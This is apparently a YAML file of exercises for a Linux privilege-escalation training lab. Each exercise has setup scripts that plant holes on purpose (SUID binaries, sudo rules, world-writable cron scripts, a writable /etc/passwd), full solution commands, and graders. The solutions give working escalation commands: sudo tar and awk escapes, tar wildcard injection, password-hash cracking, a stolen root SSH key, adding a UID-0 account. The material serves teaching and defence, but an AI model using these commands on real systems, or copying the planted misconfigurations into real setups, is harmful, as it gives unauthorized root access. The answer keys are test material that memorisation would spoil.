track: offsec
module: Linux privilege escalation
profile: offsec
order: 2
exercises:

- id: offsec-priv-001
  title: Abusing a SUID-root binary
  difficulty: 4
  kind: build
  tags: [privesc, suid, gtfobins, path]
  tutorial: |
    **Concept.** A SUID binary runs with the privileges of its *owner*, not the
    user who launched it. When that owner is root and the program can be made to
    run arbitrary commands — directly through a feature like `find -exec`, or
    indirectly by trusting an attacker-controlled `PATH` for a bare command name —
    those commands run as root too. GTFOBins catalogues which standard binaries
    can be abused this way.

    **Read up on:**
    - `ls -l` and the `s` permission bit (`-rwsr-xr-x`)
    - `find -exec` — running a command for each match
    - `$PATH` resolution, and why privileged code must call programs by absolute path
    - GTFOBins — the reference list of abusable binaries
  scenario: |
    You are the unprivileged user. The root flag is in **`/root/flag.txt`**, which
    you can't read yet. Two SUID-root binaries give you a way in.

    ## Part 1: A find with superpowers
    A SUID-root copy of `find` sits at **`/srv/kl/find`**. `find -exec` runs
    commands as its owner (root). Use it to read the flag into
    **`/lab/suidfind.txt`**.

    ## Part 2: Hijack the PATH of a SUID binary
    **`/srv/kl/report`** is SUID-root and runs a command by its **bare name**
    (`id`), trusting your `PATH`. Put your own `id` earlier in `PATH` so the SUID
    program runs your code as root, and read the flag into
    **`/lab/pathhijack.txt`**.
  hints:
    - "Part 1: confirm the bit with `ls -l /srv/kl/find`, then `/srv/kl/find . -maxdepth 0 -exec cat /root/flag.txt \\;`."
    - "Part 2: make a fake `id` that reads the flag, put its directory first in PATH: `printf '#!/bin/bash\\ncat /root/flag.txt\\n' > /tmp/id; chmod +x /tmp/id; PATH=/tmp:$PATH /srv/kl/report`."
  solution: |
    ```bash
    # Part 1 — find -exec runs as root
    /srv/kl/find . -maxdepth 0 -exec cat /root/flag.txt \; > /lab/suidfind.txt

    # Part 2 — PATH hijack of a SUID binary that calls system("id")
    printf '#!/bin/bash\ncat /root/flag.txt\n' > /tmp/id
    chmod +x /tmp/id
    PATH=/tmp:$PATH /srv/kl/report > /lab/pathhijack.txt
    ```

    Always call programs by absolute path in privileged code, and keep the SUID
    bit off anything that can run commands.
  setup: |
    root_flag >/dev/null
    mkdir -p /srv/kl
    # --- part 1: A find with superpowers ---
    install -m 4755 -o root -g root /usr/bin/find /srv/kl/find
    on_reset 'rm -f /srv/kl/find'
    # --- part 2: Hijack the PATH of a SUID binary ---
    cat > /srv/kl/report.c <<'EOF'
    #include <stdlib.h>
    int main(void){ setuid(0); setgid(0); system("id"); return 0; }
    EOF
    gcc -O2 -o /srv/kl/report /srv/kl/report.c
    chown root:root /srv/kl/report; chmod 4755 /srv/kl/report   # chmod last: chown clears the SUID bit
    rm -f /srv/kl/report.c
    on_reset 'rm -f /srv/kl/report'
  check: |
    check "cannot read the flag as the unprivileged user" \
      '! sudo -u "$(lab_user)" cat /root/flag.txt'
    info "Part 1: A find with superpowers"
    check "/srv/kl/find is SUID root" '[ -u /srv/kl/find ]'
    check_flag /lab/suidfind.txt
    info "Part 2: Hijack the PATH of a SUID binary"
    check "/srv/kl/report is SUID root" '[ -u /srv/kl/report ]'
    check_flag /lab/pathhijack.txt
  solve: |
    # --- part 1 ---
    /srv/kl/find . -maxdepth 0 -exec cat /root/flag.txt \; > /lab/suidfind.txt
    # --- part 2 ---
    printf '#!/bin/bash\ncat /root/flag.txt\n' > /tmp/id
    chmod +x /tmp/id
    PATH=/tmp:$PATH /srv/kl/report > /lab/pathhijack.txt

- id: offsec-priv-002
  title: Dangerous sudo rights
  difficulty: 4
  kind: build
  tags: [privesc, sudo, gtfobins, tar]
  tutorial: |
    **Concept.** `sudo -l` tells you which commands you may run as root. A rule
    meant to be narrow is dangerous if the allowed program can itself run other
    commands: `awk`'s `system()`, `tar`'s `--checkpoint-action=exec`, editors,
    pagers and interpreters all turn a single sudo grant into a root shell. This
    is the core of the GTFOBins "sudo" catalogue.

    **Read up on:**
    - `sudo -l` — listing your allowed commands
    - GTFOBins sudo entries for `awk` and `tar`
    - `awk 'BEGIN{system("...")}'` — running a shell command from awk
    - `tar --checkpoint=1 --checkpoint-action=exec=...` — running a command mid-archive
  scenario: |
    `sudo -l` shows you have password-less `sudo` for two programs that were never
    meant to be a way in. Use each to read **`/root/flag.txt`**.

    ## Part 1: Sudo gave you one command too many (awk)
    Use your sudo right on `/usr/bin/awk` to read the flag into **`/lab/awk.txt`**.

    ## Part 2: Sudo tar breaks out
    Use your sudo right on `/usr/bin/tar` and its `--checkpoint-action` to read the
    flag into **`/lab/tar.txt`**.
  hints:
    - "Part 1: `sudo awk 'BEGIN{system(\"cat /root/flag.txt\")}' > /lab/awk.txt`."
    - "Part 2: `sudo tar -cf /dev/null /etc/hostname --checkpoint=1 --checkpoint-action=exec='sh -c \"cat /root/flag.txt > /lab/tar.txt; chmod 644 /lab/tar.txt\"'`."
  solution: |
    ```bash
    # Part 1 — awk's system() runs as root under sudo
    sudo awk 'BEGIN{system("cat /root/flag.txt")}' > /lab/awk.txt

    # Part 2 — tar runs a command at each checkpoint
    sudo tar -cf /dev/null /etc/hostname \
      --checkpoint=1 \
      --checkpoint-action=exec='sh -c "cat /root/flag.txt > /lab/tar.txt; chmod 644 /lab/tar.txt"'
    ```
  setup: |
    root_flag >/dev/null
    U=$(lab_user)
    # --- part 1: Sudo gave you one command too many ---
    printf '%s ALL=(root) NOPASSWD: /usr/bin/awk\n' "$U" > /etc/sudoers.d/kl-awk
    chmod 440 /etc/sudoers.d/kl-awk
    on_reset 'rm -f /etc/sudoers.d/kl-awk'
    # --- part 2: Sudo tar breaks out ---
    printf '%s ALL=(root) NOPASSWD: /usr/bin/tar\n' "$U" > /etc/sudoers.d/kl-tar
    chmod 440 /etc/sudoers.d/kl-tar
    on_reset 'rm -f /etc/sudoers.d/kl-tar'
  check: |
    check "cannot read the flag directly" '! sudo -u "$(lab_user)" cat /root/flag.txt'
    info "Part 1: Sudo gave you one command too many (awk)"
    check_flag /lab/awk.txt
    info "Part 2: Sudo tar breaks out"
    check_flag /lab/tar.txt
  solve: |
    # --- part 1 ---
    sudo awk 'BEGIN{system("cat /root/flag.txt")}' > /lab/awk.txt
    # --- part 2 ---
    sudo tar -cf /dev/null /etc/hostname \
      --checkpoint=1 \
      --checkpoint-action=exec='sh -c "cat /root/flag.txt > /lab/tar.txt; chmod 644 /lab/tar.txt"'

- id: offsec-priv-003
  title: The docker group is root
  difficulty: 3
  kind: build
  tags: [privesc, docker, group]
  scenario: |
    Run `id` — you're in the **`docker`** group. Anyone who can talk to the Docker
    daemon can start a container that **mounts the host's filesystem** and reads
    anything on it as root. Membership in `docker` is effectively root.

    Mount the host's `/root` into a container and read **`/root/flag.txt`**. Write
    it to **`/lab/flag.txt`**.
  hints:
    - "Bind-mount the host directory into a throwaway container: `docker run --rm -v /root:/r alpine cat /r/flag.txt` — but use a pre-pulled image."
    - "`docker run --rm -v /root:/r:ro python:3.12-alpine cat /r/flag.txt`"
  solution: |
    ```bash
    docker run --rm -v /root:/r:ro python:3.12-alpine cat /r/flag.txt > /lab/flag.txt
    ```

    The container runs as root and the bind mount exposes the host's files, so the
    `docker` group is a direct path to root.
  setup: |
    root_flag >/dev/null
    # The offsec VM already puts the lab user in the docker group; make sure.
    usermod -aG docker "$(lab_user)" 2>/dev/null || true
  check: |
    check "cannot read the flag directly" '! sudo -u "$(lab_user)" cat /root/flag.txt'
    check_flag
  solve: |
    docker run --rm -v /root:/r:ro python:3.12-alpine cat /r/flag.txt > /lab/flag.txt

- id: offsec-priv-004
  title: Abusing a Linux capability
  difficulty: 4
  kind: build
  tags: [privesc, capabilities, dac-read]
  tutorial: |
    **Concept.** Modern Linux splits root's power into **capabilities** that can
    be attached to a single binary with `setcap`, no SUID bit required.
    `cap_setuid` lets a program call `setuid(0)` and become root; `cap_dac_read_search`
    lets it bypass file-read permission checks. `getcap` reveals what a binary
    carries, and a capability can be just as dangerous as SUID.

    **Read up on:**
    - `man capabilities` — the capability model
    - `getcap -r / 2>/dev/null` — finding files with capabilities
    - `cap_setuid` versus `cap_dac_read_search` — becoming root vs. bypassing read permission
    - why `cap_setuid` alone still can't write where root can't already
  scenario: |
    Two binaries have been granted capabilities that let you reach
    **`/root/flag.txt`** without being root. `getcap` shows what each carries.

    ## Part 1: A capability you can abuse (cap_setuid)
    A copy of Python at **`/srv/kl/python3`** has **`cap_setuid`**. Use it to set
    your UID to 0 and read the flag into **`/lab/capsetuid.txt`**.

    ## Part 2: Read any file with a capability (cap_dac_read_search)
    A copy of `tar` at **`/srv/kl/tar`** has **`cap_dac_read_search`**, which
    bypasses read permissions. Use it to extract the flag into
    **`/lab/capdac.txt`**.
  hints:
    - "Part 1: `getcap /srv/kl/python3` shows `cap_setuid=ep`; then `/srv/kl/python3 -c 'import os;os.setuid(0);print(open(\"/root/flag.txt\").read(),end=\"\")' > /lab/capsetuid.txt`."
    - "Part 2: `/srv/kl/tar cf /tmp/f.tar -P /root/flag.txt && tar xf /tmp/f.tar -O -P /root/flag.txt > /lab/capdac.txt`."
  solution: |
    ```bash
    # Part 1 — cap_setuid: become root, then read
    /srv/kl/python3 -c 'import os; os.setuid(0); print(open("/root/flag.txt").read(), end="")' > /lab/capsetuid.txt

    # Part 2 — cap_dac_read_search: tar bypasses the read check
    /srv/kl/tar cf /tmp/f.tar -P /root/flag.txt
    tar xf /tmp/f.tar -O -P /root/flag.txt > /lab/capdac.txt
    ```

    `cap_setuid` lets the process call `setuid(0)` and read root-owned files;
    `cap_dac_read_search` bypasses read checks directly. Printing the flag and
    letting your own shell redirect it into `/lab` sidesteps the fact that the
    capability does not grant write access where root has none.
  setup: |
    root_flag >/dev/null
    mkdir -p /srv/kl
    # --- part 1: A capability you can abuse (cap_setuid) ---
    cp /usr/bin/python3 /srv/kl/python3
    setcap cap_setuid+ep /srv/kl/python3
    on_reset 'rm -f /srv/kl/python3'
    # --- part 2: Read any file with a capability (cap_dac_read_search) ---
    cp /usr/bin/tar /srv/kl/tar
    setcap cap_dac_read_search+ep /srv/kl/tar
    on_reset 'rm -f /srv/kl/tar'
  check: |
    check "cannot read the flag directly" '! sudo -u "$(lab_user)" cat /root/flag.txt'
    info "Part 1: A capability you can abuse (cap_setuid)"
    check "python3 copy carries cap_setuid" 'getcap /srv/kl/python3 | grep -q cap_setuid'
    check_flag /lab/capsetuid.txt
    info "Part 2: Read any file with a capability (cap_dac_read_search)"
    check "/srv/kl/tar carries cap_dac_read_search" 'getcap /srv/kl/tar | grep -q cap_dac_read_search'
    check_flag /lab/capdac.txt
  solve: |
    # --- part 1 ---
    /srv/kl/python3 -c 'import os; os.setuid(0); print(open("/root/flag.txt").read(), end="")' > /lab/capsetuid.txt
    # --- part 2 ---
    /srv/kl/tar cf /tmp/f.tar -P /root/flag.txt
    tar xf /tmp/f.tar -O -P /root/flag.txt > /lab/capdac.txt

- id: offsec-priv-005
  title: Writable paths that root trusts
  difficulty: 5
  kind: build
  tags: [privesc, cron, writable, path, wildcard, tar]
  tutorial: |
    **Concept.** Root frequently runs scheduled jobs, and those jobs trust files
    and directories that a normal user can sometimes write. If you can write the
    script root runs, a directory early on root's `PATH`, or a directory whose
    filenames become `tar`'s arguments (wildcard injection), then your code runs
    as root on the next tick. All three are the same lesson: control an input to a
    privileged job and you control the job.

    **Read up on:**
    - `/etc/cron.d/` — the format of system cron entries (note the user field)
    - `ls -l` / `ls -ld` — spotting world-writable files and directories
    - `$PATH` ordering in a cron job's environment
    - tar wildcard injection — files named `--checkpoint=1` and `--checkpoint-action=exec=...`
  scenario: |
    Root runs three cron jobs every minute, each trusting something you can write.
    Plant the right payload in each and wait (up to ~a minute) for it to run.

    ## Part 1: The cron job you can rewrite
    `/etc/cron.d/kl-harvest` runs **`/srv/kl/collect.sh`** as root, and that script
    is world-writable. Make it copy the flag into **`/lab/cronscript.txt`**.

    ## Part 2: The writable directory on root's PATH
    A cron job runs **`backupdb`** by bare name with **`/srv/kl/bin`** (writable by
    you) early on its `PATH`. Drop a `backupdb` there that reads the flag into
    **`/lab/pathcron.txt`**.

    ## Part 3: The wildcard in root's backup
    A cron job runs `tar czf backup.tar.gz *` in **`/srv/kl/share`** (writable by
    you). Plant filenames that turn into tar options so the flag lands in
    **`/lab/wildcard.txt`**.
  hints:
    - "Part 1: overwrite `/srv/kl/collect.sh` with a script that does `cp /root/flag.txt /lab/cronscript.txt; chmod 644 /lab/cronscript.txt`, then wait for the next minute."
    - "Part 2: `printf '#!/bin/bash\\ncat /root/flag.txt > /lab/pathcron.txt; chmod 644 /lab/pathcron.txt\\n' > /srv/kl/bin/backupdb; chmod +x /srv/kl/bin/backupdb`."
    - "Part 3: in `/srv/kl/share`, create a payload `p.sh` and empty files named `--checkpoint=1` and `--checkpoint-action=exec=sh p.sh`."
  solution: |
    ```bash
    # Part 1 — rewrite the world-writable cron script
    cat > /srv/kl/collect.sh <<'EOF'
    #!/bin/bash
    cp /root/flag.txt /lab/cronscript.txt
    chmod 644 /lab/cronscript.txt
    EOF

    # Part 2 — drop our own backupdb on root's PATH
    cat > /srv/kl/bin/backupdb <<'EOF'
    #!/bin/bash
    cat /root/flag.txt > /lab/pathcron.txt
    chmod 644 /lab/pathcron.txt
    EOF
    chmod +x /srv/kl/bin/backupdb

    # Part 3 — tar wildcard injection
    cd /srv/kl/share
    echo 'cat /root/flag.txt > /lab/wildcard.txt; chmod 644 /lab/wildcard.txt' > p.sh
    touch -- '--checkpoint=1'
    touch -- '--checkpoint-action=exec=sh p.sh'

    # wait for root's cron to run all three (up to ~60s)
    for i in $(seq 1 45); do
      [ -s /lab/cronscript.txt ] && [ -s /lab/pathcron.txt ] && [ -s /lab/wildcard.txt ] && break
      sleep 2
    done
    ```
  setup: |
    root_flag >/dev/null
    mkdir -p /srv/kl
    # --- part 1: The cron job you can rewrite ---
    cat > /srv/kl/collect.sh <<'EOF'
    #!/bin/bash
    # placeholder — root runs this every minute
    :
    EOF
    chmod 0777 /srv/kl/collect.sh
    printf '* * * * * root /srv/kl/collect.sh\n' > /etc/cron.d/kl-harvest
    chmod 0644 /etc/cron.d/kl-harvest
    on_reset 'rm -f /etc/cron.d/kl-harvest /srv/kl/collect.sh'
    # --- part 2: The writable directory on root's PATH ---
    install -d -m 777 /srv/kl/bin
    printf 'PATH=/srv/kl/bin:/usr/bin:/bin\n* * * * * root backupdb\n' > /etc/cron.d/kl-backupdb
    chmod 0644 /etc/cron.d/kl-backupdb
    on_reset 'rm -f /etc/cron.d/kl-backupdb; rm -rf /srv/kl/bin'
    # --- part 3: The wildcard in root's backup ---
    install -d -m 1777 /srv/kl/share
    cat > /srv/kl/backup.sh <<'EOF'
    #!/bin/bash
    cd /srv/kl/share || exit 0
    tar czf /srv/kl/backup.tar.gz *
    EOF
    chmod 755 /srv/kl/backup.sh
    printf '* * * * * root /srv/kl/backup.sh\n' > /etc/cron.d/kl-backup
    chmod 0644 /etc/cron.d/kl-backup
    on_reset 'rm -f /etc/cron.d/kl-backup; rm -rf /srv/kl/share /srv/kl/backup.sh /srv/kl/backup.tar.gz'
  check: |
    check "cannot read the flag directly" '! sudo -u "$(lab_user)" cat /root/flag.txt'
    info "Part 1: The cron job you can rewrite"
    check "the cron script is writable" 'sudo -u "$(lab_user)" test -w /srv/kl/collect.sh'
    check_flag /lab/cronscript.txt
    info "Part 2: The writable directory on root's PATH"
    check "PATH dir is writable" 'sudo -u "$(lab_user)" test -w /srv/kl/bin'
    check_flag /lab/pathcron.txt
    info "Part 3: The wildcard in root's backup"
    check "backup dir is writable" 'sudo -u "$(lab_user)" test -w /srv/kl/share'
    check_flag /lab/wildcard.txt
  solve: |
    # --- part 1 ---
    cat > /srv/kl/collect.sh <<'EOF'
    #!/bin/bash
    cp /root/flag.txt /lab/cronscript.txt
    chmod 644 /lab/cronscript.txt
    EOF
    # --- part 2 ---
    cat > /srv/kl/bin/backupdb <<'EOF'
    #!/bin/bash
    cat /root/flag.txt > /lab/pathcron.txt
    chmod 644 /lab/pathcron.txt
    EOF
    chmod +x /srv/kl/bin/backupdb
    # --- part 3 ---
    cd /srv/kl/share
    echo 'cat /root/flag.txt > /lab/wildcard.txt; chmod 644 /lab/wildcard.txt' > p.sh
    touch -- '--checkpoint=1'
    touch -- '--checkpoint-action=exec=sh p.sh'
    # wait for all three cron jobs to run (up to ~90s)
    for i in $(seq 1 45); do
      [ -s /lab/cronscript.txt ] && [ -s /lab/pathcron.txt ] && [ -s /lab/wildcard.txt ] && break
      sleep 2
    done

- id: offsec-priv-006
  title: Credentials left lying around
  difficulty: 4
  kind: build
  tags: [privesc, creds, hashcracking, john, ssh, keys]
  tutorial: |
    **Concept.** Privilege escalation is often just finding a credential someone
    left behind. A readable copy of the password database can be cracked offline;
    a private SSH key copied to a world-readable path is a login waiting to be
    used. Neither needs an exploit — you are reusing an existing account.

    **Read up on:**
    - `unshadow` + `john --wordlist=...` — cracking a `passwd`/`shadow` pair
    - `john --show` — printing recovered passwords
    - SSH private keys, `authorized_keys`, and `ssh -i`
    - why key files must be mode `600` and never world-readable
  scenario: |
    Two leftover credentials give you root on this box.

    ## Part 1: Crack the root password
    A careless backup left **`/srv/kl/passwd.bak`** and **`/srv/kl/shadow.bak`**
    readable. Root's password is weak. Crack it with **John** and the wordlist
    **`/usr/share/kl/wordlists/top.txt`**, and write the recovered plaintext
    password to **`/lab/password.txt`**.

    ## Part 2: The key left lying around
    Root's **private SSH key** was left world-readable at **`/srv/kl/id_root`**.
    SSH in as root with it and read **`/root/flag.txt`** into **`/lab/flag.txt`**.
  hints:
    - "Part 1: `unshadow /srv/kl/passwd.bak /srv/kl/shadow.bak > /tmp/u; john --wordlist=/usr/share/kl/wordlists/top.txt /tmp/u; john --show /tmp/u`."
    - "Part 2: fix the key's mode first: `cp /srv/kl/id_root /tmp/k; chmod 600 /tmp/k; ssh -i /tmp/k -o StrictHostKeyChecking=no root@127.0.0.1 cat /root/flag.txt`."
  solution: |
    ```bash
    # Part 1 — crack root's password from the readable backup
    rm -f "$HOME/.john/john.pot" 2>/dev/null
    unshadow /srv/kl/passwd.bak /srv/kl/shadow.bak > /tmp/u
    john --wordlist=/usr/share/kl/wordlists/top.txt /tmp/u
    john --show /tmp/u | awk -F: '/^root:/{print $2}' | head -1 > /lab/password.txt

    # Part 2 — log in as root with the leaked key
    cp /srv/kl/id_root /tmp/k && chmod 600 /tmp/k
    ssh -i /tmp/k -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
      root@127.0.0.1 'cat /root/flag.txt' > /lab/flag.txt
    ```
  setup: |
    mkdir -p /srv/kl
    # --- part 1: Crack the root password ---
    PW=hunter2
    echo "$PW" > "$KL_STATE/pw"
    HASH=$(openssl passwd -6 "$PW")
    cp /etc/passwd /srv/kl/passwd.bak; chmod 644 /srv/kl/passwd.bak
    # give root the weak password in the readable backup only (not the live system)
    awk -v h="$HASH" -F: 'BEGIN{OFS=":"} $1=="root"{$2=h} {print}' /etc/shadow > /srv/kl/shadow.bak
    chmod 644 /srv/kl/shadow.bak
    on_reset 'rm -f /srv/kl/passwd.bak /srv/kl/shadow.bak'
    # --- part 2: The key left lying around ---
    root_flag >/dev/null
    install -d -m 700 /root/.ssh
    if [ ! -f /root/.ssh/id_ed25519 ]; then
      ssh-keygen -q -t ed25519 -N "" -f /root/.ssh/id_ed25519
    fi
    grep -qF "$(cat /root/.ssh/id_ed25519.pub)" /root/.ssh/authorized_keys 2>/dev/null \
      || cat /root/.ssh/id_ed25519.pub >> /root/.ssh/authorized_keys
    chmod 600 /root/.ssh/authorized_keys
    cp /root/.ssh/id_ed25519 /srv/kl/id_root; chmod 644 /srv/kl/id_root
    on_reset 'rm -f /srv/kl/id_root'
  check: |
    info "Part 1: Crack the root password"
    check "backup hashes are readable" 'sudo -u "$(lab_user)" test -r /srv/kl/shadow.bak'
    want=$(cat "$KL_STATE/pw")
    got=$(tr -d '[:space:]' < /lab/password.txt 2>/dev/null)
    check_eq "cracked root password matches" "$got" "$want"
    info "Part 2: The key left lying around"
    check "cannot read the flag directly" '! sudo -u "$(lab_user)" cat /root/flag.txt'
    check "root private key is readable" 'sudo -u "$(lab_user)" test -r /srv/kl/id_root'
    check_flag /lab/flag.txt
  solve: |
    # --- part 1 ---
    rm -f "$HOME/.john/john.pot" 2>/dev/null || true
    unshadow /srv/kl/passwd.bak /srv/kl/shadow.bak > /tmp/u
    john --wordlist=/usr/share/kl/wordlists/top.txt /tmp/u >/dev/null 2>&1
    john --show /tmp/u 2>/dev/null | awk -F: '/^root:/{print $2}' | head -1 > /lab/password.txt
    # --- part 2 ---
    cp /srv/kl/id_root /tmp/k && chmod 600 /tmp/k
    ssh -i /tmp/k -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
      root@127.0.0.1 'cat /root/flag.txt' > /lab/flag.txt

- id: offsec-priv-008
  title: Hijack the imported module
  difficulty: 4
  kind: build
  tags: [privesc, sudo, python]
  scenario: |
    `sudo -l` shows you can run a reporting tool as root with NOPASSWD:
    **`/usr/bin/python3 /opt/kl/report.py`**. That script does
    `import klhelper` — and it loads `klhelper` from **`/srv/kl/lib`**, a directory
    **you can write to**. Python imports run the module's code, so if you replace
    `klhelper.py`, *your* code runs as root.

    Overwrite the module so it reads **`/root/flag.txt`** into **`/lab/flag.txt`**,
    then trigger the script with sudo.
  hints:
    - "`ls -ld /srv/kl/lib` — it's writable. Rewrite `/srv/kl/lib/klhelper.py` so its `main()` copies the flag, then run the sudo command."
    - "Put the copy in `main()`: `open('/lab/flag.txt','w').write(open('/root/flag.txt').read())`, then `sudo /usr/bin/python3 /opt/kl/report.py`."
  solution: |
    The script trusts a module directory you control, so replace the module:

    ```bash
    cat > /srv/kl/lib/klhelper.py <<'EOF'
    def main():
        data = open("/root/flag.txt").read()
        open("/lab/flag.txt", "w").write(data)
        import os; os.chmod("/lab/flag.txt", 0o644)
    EOF
    sudo /usr/bin/python3 /opt/kl/report.py
    ```

    `import` executing code from a writable path is a classic privilege-escalation
    sink; privileged scripts must import only from trusted, non-writable locations.
  setup: |
    root_flag >/dev/null
    install -d -m 755 /opt/kl
    cat > /opt/kl/report.py <<'EOF'
    import sys
    sys.path.insert(0, "/srv/kl/lib")   # VULNERABLE: a writable dir on the import path
    import klhelper
    klhelper.main()
    EOF
    chmod 644 /opt/kl/report.py
    install -d -m 777 /srv/kl/lib
    cat > /srv/kl/lib/klhelper.py <<'EOF'
    def main():
        print("daily report: ok")
    EOF
    chmod 666 /srv/kl/lib/klhelper.py
    U=$(lab_user)
    printf '%s ALL=(root) NOPASSWD: /usr/bin/python3 /opt/kl/report.py\n' "$U" > /etc/sudoers.d/kl-report
    chmod 440 /etc/sudoers.d/kl-report
    on_reset 'rm -rf /opt/kl /srv/kl/lib; rm -f /etc/sudoers.d/kl-report'
  check: |
    check "cannot read the flag directly" '! sudo -u "$(lab_user)" cat /root/flag.txt'
    check "the import directory is writable" 'sudo -u "$(lab_user)" test -w /srv/kl/lib'
    check_flag
  solve: |
    cat > /srv/kl/lib/klhelper.py <<'EOF'
    def main():
        data = open("/root/flag.txt").read()
        open("/lab/flag.txt", "w").write(data)
        import os; os.chmod("/lab/flag.txt", 0o644)
    EOF
    sudo /usr/bin/python3 /opt/kl/report.py

- id: offsec-priv-010
  title: The world-writable passwd file
  difficulty: 4
  kind: build
  tags: [privesc, passwd, writable]
  scenario: |
    Check the permissions on **`/etc/passwd`** (`ls -l /etc/passwd`). It is
    **writable by everyone** — a catastrophic misconfiguration. You can add a brand
    new account with **UID 0** (root) and a password you choose, then switch to it.

    Add a root-equivalent user, become root, and read **`/root/flag.txt`** into
    **`/lab/flag.txt`**.
  hints:
    - "Generate a hash with `openssl passwd -1 pass123`, then append `hacker:<hash>:0:0:root:/root:/bin/bash` to `/etc/passwd`."
    - "Switch user non-interactively with a pty, e.g. `python3 -c 'import pty;pty.spawn([\"su\",\"hacker\"])'` and type the password, or script it."
  solution: |
    ```bash
    HASH=$(openssl passwd -1 pass123)
    echo "hacker:$HASH:0:0:root:/root:/bin/bash" >> /etc/passwd
    # become the new UID-0 user and grab the flag
    echo pass123 | su - hacker -c 'cat /root/flag.txt' > /lab/flag.txt
    ```

    An extra UID-0 entry is a full root account; writable `/etc/passwd` hands it to
    anyone.
  setup: |
    root_flag >/dev/null
    cp -a /etc/passwd /etc/passwd
    chmod 666 /etc/passwd
    # state.sh restores /etc/passwd (perms + contents) on reset.
  check: |
    check "/etc/passwd is world-writable" '[ -w /etc/passwd ] && sudo -u "$(lab_user)" test -w /etc/passwd'
    check "cannot read the flag directly" '! sudo -u "$(lab_user)" cat /root/flag.txt'
    check_flag
  solve: |
    HASH=$(openssl passwd -1 pass123)
    echo "hacker:$HASH:0:0:root:/root:/bin/bash" >> /etc/passwd
    echo pass123 | su - hacker -c 'cat /root/flag.txt' > /lab/flag.txt

- id: offsec-priv-013
  title: Sudo can restart a service you own
  difficulty: 4
  kind: build
  tags: [privesc, sudo, systemd]
  scenario: |
    `sudo -l` lets you run **`/usr/bin/systemctl`** as root (NOPASSWD). systemd
    units are just files that say what command to run as root — and you can point
    a unit at your own command, then start it with your sudo right.

    A writable unit file is at **`/srv/kl/pwn.service`**. Make it read
    **`/root/flag.txt`**, install and start it with sudo, and write the flag to
    **`/lab/flag.txt`**.
  hints:
    - "Edit `ExecStart=` to copy the flag: `/bin/bash -c 'cat /root/flag.txt > /lab/flag.txt; chmod 644 /lab/flag.txt'`."
    - "`sudo systemctl link /srv/kl/pwn.service && sudo systemctl start pwn` (Type=oneshot)."
  solution: |
    ```bash
    cat > /srv/kl/pwn.service <<'EOF'
    [Unit]
    Description=pwn
    [Service]
    Type=oneshot
    ExecStart=/bin/bash -c 'cat /root/flag.txt > /lab/flag.txt; chmod 644 /lab/flag.txt'
    EOF
    sudo systemctl link /srv/kl/pwn.service
    sudo systemctl start pwn
    ```
  setup: |
    root_flag >/dev/null
    mkdir -p /srv/kl
    U=$(lab_user)
    printf '%s ALL=(root) NOPASSWD: /usr/bin/systemctl\n' "$U" > /etc/sudoers.d/kl-systemctl
    chmod 440 /etc/sudoers.d/kl-systemctl
    cat > /srv/kl/pwn.service <<'EOF'
    [Unit]
    Description=placeholder
    [Service]
    Type=oneshot
    ExecStart=/bin/true
    EOF
    chmod 666 /srv/kl/pwn.service
    on_reset 'rm -f /etc/sudoers.d/kl-systemctl /etc/systemd/system/pwn.service; systemctl daemon-reload 2>/dev/null || true'
  check: |
    check "cannot read the flag directly" '! sudo -u "$(lab_user)" cat /root/flag.txt'
    check_flag
  solve: |
    cat > /srv/kl/pwn.service <<'EOF'
    [Unit]
    Description=pwn
    [Service]
    Type=oneshot
    ExecStart=/bin/bash -c 'cat /root/flag.txt > /lab/flag.txt; chmod 644 /lab/flag.txt'
    EOF
    sudo systemctl link /srv/kl/pwn.service
    sudo systemctl start pwn
    for i in $(seq 1 10); do [ -s /lab/flag.txt ] && break; sleep 1; done

- id: offsec-priv-016
  title: Enumerate your way in
  difficulty: 3
  kind: build
  tags: [privesc, enumeration]
  scenario: |
    No hint about the vector this time — this is what real privilege escalation
    feels like. **Enumerate** the system to find the one weakness, exploit it, and
    read **`/root/flag.txt`** into **`/lab/flag.txt`**.

    Good things to check: `sudo -l`, SUID binaries
    (`find / -perm -4000 -type f 2>/dev/null`), file capabilities
    (`getcap -r / 2>/dev/null`), writable files in `/etc`, and cron. Exactly one of
    them is the way in.
  hints:
    - "Sweep for SUID binaries: `find / -perm -4000 -type f 2>/dev/null`. One of them is an unusual binary under `/opt`."
    - "`/opt/backup/bash` is a SUID copy of bash — run `/opt/backup/bash -p` for a root shell, then read the flag."
  solution: |
    Enumeration finds a SUID `bash` at `/opt/backup/bash`. `bash -p` keeps the
    elevated privileges:

    ```bash
    find / -perm -4000 -type f 2>/dev/null        # ... /opt/backup/bash
    /opt/backup/bash -p -c 'cat /root/flag.txt' > /lab/flag.txt
    ```
  setup: |
    root_flag >/dev/null
    install -d -m 755 /opt/backup
    install -m 4755 -o root -g root /usr/bin/bash /opt/backup/bash
    on_reset 'rm -rf /opt/backup'
  check: |
    check "cannot read the flag directly" '! sudo -u "$(lab_user)" cat /root/flag.txt'
    check_flag
  solve: |
    /opt/backup/bash -p -c 'cat /root/flag.txt' > /lab/flag.txt

- id: offsec-priv-017
  title: Harden the box
  difficulty: 3
  kind: fix
  tags: [privesc, suid, sudo, remediation, hardening]
  tutorial: |
    **Concept.** This is the defender's side of privilege escalation: find the
    thing that grants root and remove it. A needless SUID bit on a shell is a free
    root shell for anyone, so strip it. An over-broad sudo rule — one that allows
    an editor, pager or interpreter — is a root shell too, so rewrite it to allow
    only a command that can't be turned into one. Always validate a sudoers file
    with `visudo -c` before trusting it; a syntax error can lock out sudo entirely.

    **Read up on:**
    - `find -perm -4000` and `chmod u-s` — finding and removing the SUID bit
    - the sudoers format and `visudo -cf FILE` — validating syntax offline
    - GTFOBins — which commands must never appear in a sudo rule (`vi`, `less`, `awk`, ...)
    - least privilege — granting only what a task genuinely needs
  scenario: |
    You're the administrator now. Close two privilege-escalation holes.

    ## Part 1: Take away the SUID bit
    A dangerous **SUID-root `bash`** sits at **`/opt/backup/bash`**. Remove the
    SUID bit so no file under **`/opt/backup`** is SUID any more. (You have
    password-less `sudo` for `chmod`.)

    ## Part 2: Fix the sudo rule
    **`/lab/kl-sudoers`** grants the `labs` group password-less root for
    **`/usr/bin/vi`** — and `vi` can spawn a shell. Rewrite it so it still grants a
    harmless capability (let the group run **`/usr/bin/id`** as root) but the
    dangerous `vi` rule is gone. It must pass `visudo -c`.
  hints:
    - "Part 1: `find /opt/backup -perm -4000` then `sudo chmod u-s /opt/backup/bash`."
